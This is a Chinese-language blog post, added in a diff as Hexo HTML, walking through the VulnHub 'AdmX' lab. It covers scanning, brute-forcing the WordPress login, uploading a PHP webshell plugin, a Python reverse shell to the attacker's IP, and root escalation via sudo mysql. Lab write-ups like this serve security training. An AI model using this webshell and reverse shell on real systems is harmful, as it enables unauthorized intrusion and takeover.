@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        AdmX | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">AdmX</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-tag">#漏洞利用</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">主机发现</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">feroxbuster 工具</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Burp 抓包</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Match and replace rules</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">爆破</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">反弹Shell</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">MSF漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">提权</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22356351/1677758921744-a47f8cb5-b5cd-4576-925c-d8ceab26d429.jpeg"><br><a name="eh49l"></a></p>
+<h1><span id="主机发现">主机发现</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677759041231-12e5c6ed-e6e7-423f-a030-1351a83e0bf0.png#averageHue=%23262b38&clientId=u1063f81f-0383-4&from=paste&height=193&id=uefc2f85f&name=image.png&originHeight=193&originWidth=697&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72484&status=done&style=none&taskId=ua4dd61e8-6a97-4844-9819-86ea3075af7&title=&width=697" alt="image.png"><br> 靶机  ： <code>192.168.145.131</code><br>131  这台主机  存活<br><a name="fW6gG"></a></p>
+<h1><span id="端口扫描">端口扫描</span></h1><blockquote>
+<p>nmap -sV -O -p 1-65535 192.168.145.131</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677759586549-cd6d1f8d-9274-4ee7-bd8b-24fed6e28599.png#averageHue=%23262a36&clientId=u56a145cf-b69c-4&from=paste&height=315&id=uebfa025b&name=image.png&originHeight=315&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111389&status=done&style=none&taskId=u1a0c7a49-5953-489d-a509-662fdf33fc9&title=&width=701" alt="image.png"><br>存在 80 端口  ，这里连ssh 端口都没了  <br>80 端口存在 Apache   httpd 2.4.1  <br>存在 Apache 默认页面 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677759755678-475af44d-c605-4a1f-a61c-a10a5664b970.png#averageHue=%23d3eaec&clientId=u56a145cf-b69c-4&from=paste&height=879&id=ucc6364f0&name=image.png&originHeight=879&originWidth=1013&originalType=binary&ratio=1&rotation=0&showTitle=false&size=211107&status=done&style=none&taskId=uf2a1c706-2836-4135-b0c6-deacd10d497&title=&width=1013" alt="image.png"><br> <br>像这种页面 ，没有什么具体的价值  扫描一下是否存在其他页面<br><a name="FgbNN"></a></p>
+<h1><span id="目录扫描">目录扫描</span></h1><p><a name="ip5cX"></a></p>
+<h2><span id="feroxbuster-工具">feroxbuster 工具</span></h2><p>目录探测工具，用暴力结合字典在目标目录中搜索未链接的内容<br>使用 web目录扫描工具进行扫描发现存在 wordpress  301  重定向 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677760778067-445aa533-475b-4a03-9371-a3fa42191406.png#averageHue=%23262c3a&clientId=u56a145cf-b69c-4&from=paste&height=878&id=u421d9960&name=image.png&originHeight=878&originWidth=1179&originalType=binary&ratio=1&rotation=0&showTitle=false&size=761527&status=done&style=none&taskId=ua66a3e80-6cb2-4fa7-a023-38e73e91e81&title=&width=1179" alt="image.png"><br>可能搭建了wordpress 博客系统 <br>访问一下 wordpress 登录系统 </p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.145.131/wordpress/wp-admin/">http://192.168.145.131/wordpress/wp-admin/</a>  </p>
+</blockquote>
+<p>web访问一直访问不了 ，一直在转圈圈 oooo<br><a name="p5jAf"></a></p>
+<h1><span id="burp-抓包">Burp 抓包</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677762600451-1c9e3bcd-52b7-4f66-b820-ce2322b673bc.png#averageHue=%23202028&clientId=u56a145cf-b69c-4&from=paste&height=473&id=ua086120e&name=image.png&originHeight=473&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61409&status=done&style=none&taskId=ud4a08ba5-ea60-402f-96ea-6fe70f4d69f&title=&width=942" alt="image.png"><br>抓包查看数据 <br>抓包也是一直转圈圈 <br>但是发现一个奇怪的现象 ，当还存在一直转圈 ，重定向一个我们不知道的地址去 <br>但是当我终止他的时候 ，会发现IP变了 地址没有变<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677763142233-ba63eed0-8f0b-4761-bd74-80a1ecc6a8c5.png#averageHue=%23dfe0ba&clientId=u56a145cf-b69c-4&from=paste&height=781&id=u83788c82&name=image.png&originHeight=781&originWidth=1288&originalType=binary&ratio=1&rotation=0&showTitle=false&size=155130&status=done&style=none&taskId=u6f345c34-548e-4868-afbe-226c208c3b7&title=&width=1288" alt="image.png"><br>ip 变成了 192.168.159.145<br>这个IP 可能是重定向的那个内网IP地址<br><a name="NEYMl"></a></p>
+<h2><span id="match-and-replace-rules">Match and replace rules</span></h2><p>匹配替换规则 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677763388897-bbfccfec-d6ce-4111-bc87-97fd233f2dcf.png#averageHue=%23f8f7f6&clientId=u56a145cf-b69c-4&from=paste&height=626&id=u2bce9566&name=image.png&originHeight=626&originWidth=1164&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62279&status=done&style=none&taskId=uc1e59d34-3b69-450b-903d-62a331db713&title=&width=1164" alt="image.png"><br>只要在数据包中发现 存在 192.168.159.145 就替换成 192.168.145.131 这个IP地址 <br>响应 body 也要修改<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677763583199-4bebc9e2-b3e2-46d7-b060-e7d615e03f24.png#averageHue=%23f7f5f4&clientId=u56a145cf-b69c-4&from=paste&height=656&id=uc35df15a&name=image.png&originHeight=656&originWidth=848&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51782&status=done&style=none&taskId=u06b8e4cd-95dd-4ea8-bebb-24cdc7ada0b&title=&width=848" alt="image.png"><br>然后去挂代理访问就可以看见正常的页面了 </p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677763798262-630ebdac-695b-475e-bd1e-900a99f7c97c.png#averageHue=%233e433c&clientId=u56a145cf-b69c-4&from=paste&height=1126&id=u3a265d98&name=image.png&originHeight=1126&originWidth=1858&originalType=binary&ratio=1&rotation=0&showTitle=false&size=215035&status=done&style=none&taskId=uc4aeebba-c6bf-403b-bd2c-b89e7ee09cb&title=&width=1858" alt="image.png"><br>成功访问页面 了 <br>找到  wordpress 后台页面 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677763986160-8fc5e123-938c-4316-9228-d62e35962e12.png#averageHue=%23dedee0&clientId=u56a145cf-b69c-4&from=paste&height=838&id=u59a6ccb1&name=image.png&originHeight=838&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31515&status=done&style=none&taskId=uacd69a01-4250-4be9-8536-3e81fbd1f6b&title=&width=1226" alt="image.png"><br><a name="Uosds"></a></p>
+<h2><span id="爆破">爆破</span></h2><p>默认admin  <br>然后输入admin admin  不对 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677764054899-b03fec69-ee97-4485-8418-9744b6d12e57.png#averageHue=%23dfe1e4&clientId=u56a145cf-b69c-4&from=paste&height=793&id=u726e6aa0&name=image.png&originHeight=793&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28047&status=done&style=none&taskId=ue06695d6-9f66-46da-a2b3-ca3bd7d0728&title=&width=1016" alt="image.png"><br>那就开始爆破密码<br>成功爆破出密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677764714515-8f07dcb1-b93e-4278-8791-5604e1284991.png#averageHue=%23f8f4f2&clientId=u56a145cf-b69c-4&from=paste&height=638&id=ubf7e3859&name=image.png&originHeight=638&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63622&status=done&style=none&taskId=ueac99640-37e5-450a-b673-a21199aac82&title=&width=817" alt="image.png"><br>adam14<br>登录 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677764736291-37e04b60-b893-449c-97c5-1e73f20a310e.png#averageHue=%23c2c4c7&clientId=u56a145cf-b69c-4&from=paste&height=1078&id=ua1e91cb7&name=image.png&originHeight=1078&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103345&status=done&style=none&taskId=u5cd62f75-5c8e-45f2-997c-9e6e462485f&title=&width=1173" alt="image.png"></p>
+<p>wordpress 多数是存在文件上传php 文件 反弹shell的 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677765025032-51206560-6cf7-44c2-9d0e-b49108a922eb.png#averageHue=%2325282e&clientId=u56a145cf-b69c-4&from=paste&height=1183&id=u4510f471&name=image.png&originHeight=1183&originWidth=845&originalType=binary&ratio=1&rotation=0&showTitle=false&size=190728&status=done&style=none&taskId=u92aa1cc0-570a-4bf6-aa95-9598d56a3a7&title=&width=845" alt="image.png"></p>
+<p><a name="zXbLm"></a></p>
+<h1><span id="反弹shell">反弹Shell</span></h1><p>wordpress 利用上传插件进行 反弹shell  <br>现写个一句话木马 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">* Plugin Name:Webshell</span><br><span class="hljs-comment">* Plugin URI:https//yuanfh.github.io</span><br><span class="hljs-comment">* Description:WP Webshell for Pentest</span><br><span class="hljs-comment">* Version:1.0</span><br><span class="hljs-comment">* Author:aaaa</span><br><span class="hljs-comment">* Author URI:https://aaaa.github.io</span><br><span class="hljs-comment">* License:https://aaaa.github.io</span><br><span class="hljs-comment">*/</span><br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))<br><br>  &#123;<br>  <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>然后在压缩一下 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677766411288-a218d8fa-3f39-4bf5-a950-ccfad8b4a345.png#averageHue=%2398a9c4&clientId=u56a145cf-b69c-4&from=paste&height=102&id=uc8c82940&name=image.png&originHeight=102&originWidth=83&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16994&status=done&style=none&taskId=u4620e800-2cf4-47d8-813b-5b0668f4a21&title=&width=83" alt="image.png"><br>上传<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677766607031-f4294147-64cd-43da-86ac-59e30ddce693.png#averageHue=%23eeeff0&clientId=u56a145cf-b69c-4&from=paste&height=372&id=u3cea649d&name=image.png&originHeight=372&originWidth=932&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18032&status=done&style=none&taskId=u2f8007c0-a70b-40fd-87cb-6f0e0ace6e1&title=&width=932" alt="image.png"><br>然后上传成功之后的路径是 <br>&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;shell&#x2F;<br>利用shell 进行 RCE <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677766656235-c70ee8da-c04c-4423-b996-03de6ddda860.png#averageHue=%23fdfdfd&clientId=u56a145cf-b69c-4&from=paste&height=286&id=u8c723c53&name=image.png&originHeight=286&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11026&status=done&style=none&taskId=uf05675e0-83c4-4f38-aee0-80091401aed&title=&width=876" alt="image.png"><br>成功执行 id 命令<br>改变一句话 ，修改成webshell  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677766812350-a05e20e2-7d08-41ea-b1f1-2f5b48ab014f.png#averageHue=%23e9ebee&clientId=u56a145cf-b69c-4&from=paste&height=530&id=u7f768c00&name=image.png&originHeight=530&originWidth=633&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29660&status=done&style=none&taskId=uba9aedf1-f8fb-47a1-958d-47e2054d6f2&title=&width=633" alt="image.png"><br>可以执行命令但是 连接不了webshell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677767105497-ff47e292-d2dd-4c4a-97ae-58c44934a004.png#averageHue=%23c6c5c3&clientId=u56a145cf-b69c-4&from=paste&height=795&id=u5a3ca5fc&name=image.png&originHeight=795&originWidth=1852&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131225&status=done&style=none&taskId=uec28d1fc-4c20-4733-a5b2-469a3a760aa&title=&width=1852" alt="image.png"></p>
+<p>那就使用 命令进行反弹shell<br>现开启监听<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677767256086-0fc71c73-7cd0-4ae4-a64d-4b93ad0da1d9.png#averageHue=%23252939&clientId=u56a145cf-b69c-4&from=paste&height=155&id=u5c2168ad&name=image.png&originHeight=155&originWidth=388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43828&status=done&style=none&taskId=u224d244a-1610-4073-8179-15554b327f2&title=&width=388" alt="image.png"><br>利用 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.145.130&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677767328362-1cf1fcb0-0203-42c6-996b-5c2af412951c.png#averageHue=%23b9d5b2&clientId=u56a145cf-b69c-4&from=paste&height=494&id=u4f2630c4&name=image.png&originHeight=494&originWidth=1561&originalType=binary&ratio=1&rotation=0&showTitle=false&size=336740&status=done&style=none&taskId=u7b4c364e-4148-4238-9b96-733959e6d85&title=&width=1561" alt="image.png"><br>成功反弹了shell</p>
+<p><a name="KldW8"></a></p>
+<h1><span id="msf漏洞利用">MSF漏洞利用</span></h1><p>这里有个更加简单的利用方法 ，使用msf进行 利用 <br>在爆破账号密码之后 有个 更好用的方法就是使用MSF自动化的工具去进行获取shell<br>搜索 wp_admin_shell<br>存在一个文件上传的漏洞 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677767552576-c7d6a3c8-2710-4f70-86bd-0e50c08aa7e0.png#averageHue=%23242733&clientId=u56a145cf-b69c-4&from=paste&height=236&id=u5915ca99&name=image.png&originHeight=236&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53506&status=done&style=none&taskId=u93fc9a69-541a-45c6-a4b5-8470886b2b4&title=&width=831" alt="image.png"></p>
+<p>show 一下 查看需要哪些参数  进行配置<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677767664598-51119f43-5a0e-4e4a-8308-ab8f80d13ef0.png#averageHue=%23242833&clientId=u56a145cf-b69c-4&from=paste&height=581&id=u06c16e5c&name=image.png&originHeight=581&originWidth=760&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133097&status=done&style=none&taskId=uaba16751-958e-4b41-b48d-f583487ffff&title=&width=760" alt="image.png"><br>账号密码 路径   <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677768268120-011a2272-f0ce-4059-8b01-e10ee381aa34.png#averageHue=%23252834&clientId=u56a145cf-b69c-4&from=paste&height=640&id=ufc7891fc&name=image.png&originHeight=640&originWidth=774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=219963&status=done&style=none&taskId=ued536be4-dfda-42d8-aec3-9e3d29b2368&title=&width=774" alt="image.png"><br>一直不成功这里  不知道为啥 。。。。<br>看来还是得用反弹shell</p>
+<p><a name="xFzJ3"></a></p>
+<h1><span id="提权">提权</span></h1><p>查看<br>&#x2F;etc&#x2F;passwd<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677768835419-44682d4e-a962-4238-ab9a-4d0e5e40413e.png#averageHue=%23292f3d&clientId=u56a145cf-b69c-4&from=paste&height=201&id=uc88c1b3a&name=image.png&originHeight=201&originWidth=560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87067&status=done&style=none&taskId=u4f00c239-8c4c-43bd-a4b5-f664013aa91&title=&width=560" alt="image.png"><br>存在着另外一个用户  wpadmin<br>使用一开始的密码登录 <br>adam14 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677768925730-fc13f0dc-a887-411b-bafe-66afb54b5b81.png#averageHue=%23252935&clientId=u56a145cf-b69c-4&from=paste&height=202&id=ue5ab86d1&name=image.png&originHeight=202&originWidth=425&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36109&status=done&style=none&taskId=u8aa42a56-4416-494f-98af-b48d1d44ae1&title=&width=425" alt="image.png"><br>第一个flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677768953151-68efae6f-1d37-4922-9285-9c61ce98ece6.png#averageHue=%23262a36&clientId=u56a145cf-b69c-4&from=paste&height=118&id=udeea1cf8&name=image.png&originHeight=118&originWidth=333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19859&status=done&style=none&taskId=ue2c0ca09-3f8a-48e7-b1f3-6cc8f028f03&title=&width=333" alt="image.png"><br>提权 <br>第一个 sudo -l  查看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677768985644-fcba2729-df4e-4b31-aaf2-c3c5f9b9ac8a.png#averageHue=%23262935&clientId=u56a145cf-b69c-4&from=paste&height=211&id=u47817f6b&name=image.png&originHeight=211&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89913&status=done&style=none&taskId=u3c1633a0-2580-46f2-82b9-f21adb26f7d&title=&width=766" alt="image.png"><br>发现 mysql 是拥有root 权限的 <br>登录测试了一下 没有密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677769084656-9ec9eea2-c5d2-4501-9ad8-fa87b7549193.png#averageHue=%23252935&clientId=u56a145cf-b69c-4&from=paste&height=291&id=u871ab5da&name=image.png&originHeight=291&originWidth=780&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117080&status=done&style=none&taskId=uc5172739-ac51-435f-bd54-b4106b65ed3&title=&width=780" alt="image.png"><br>去翻翻 wp的配置文件 <br>&#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php <br>wp-config.php 是配置文件<br>存在数据库的密码 还有一些 key<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677769298832-ca7a942c-4400-44d4-9501-11f7956c0984.png#averageHue=%23262b36&clientId=u56a145cf-b69c-4&from=paste&height=380&id=u4e67a4a3&name=image.png&originHeight=380&originWidth=795&originalType=binary&ratio=1&rotation=0&showTitle=false&size=168469&status=done&style=none&taskId=u406d2426-7cd0-49cd-afc1-1da161e720e&title=&width=795" alt="image.png"><br>成功登录数据库<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677769374591-3caf6db6-c0bf-4fd5-986c-00fedaeb2374.png#averageHue=%23252934&clientId=u56a145cf-b69c-4&from=paste&height=238&id=ub892783d&name=image.png&originHeight=238&originWidth=687&originalType=binary&ratio=1&rotation=0&showTitle=false&size=93064&status=done&style=none&taskId=u32e36396-a510-4619-9ac1-84756f4e4df&title=&width=687" alt="image.png"></p>
+<p>但是还是提权不了 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677769720915-84417d97-dc86-417b-a92e-60d4236b610f.png#averageHue=%23252835&clientId=u56a145cf-b69c-4&from=paste&height=596&id=ua3175406&name=image.png&originHeight=596&originWidth=1118&originalType=binary&ratio=1&rotation=0&showTitle=false&size=341513&status=done&style=none&taskId=u1aae312b-96e1-4f68-946c-e0ba52efbd4&title=&width=1118" alt="image.png"><br>后面反复查看 发现使用sudo &#x2F;usr&#x2F;bin&#x2F;mysql  -u root -D wordpress - p<br>是不需要密码的  靠  。。。。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1677769946045-d3d423a8-3679-4d72-880c-e13d1a1a6231.png#averageHue=%23252934&clientId=u56a145cf-b69c-4&from=paste&height=350&id=u4299301d&name=image.png&originHeight=350&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=132974&status=done&style=none&taskId=uec710cdb-a509-4aad-8294-1a105f91f91&title=&width=766" alt="image.png"><br>最后也是终于成功提权 ，成为root 用户</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/20/PHP%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>2-PHP前置基础知识</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/19/CLOUD%20AV/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      Cloud AV
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-tag">#漏洞利用</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
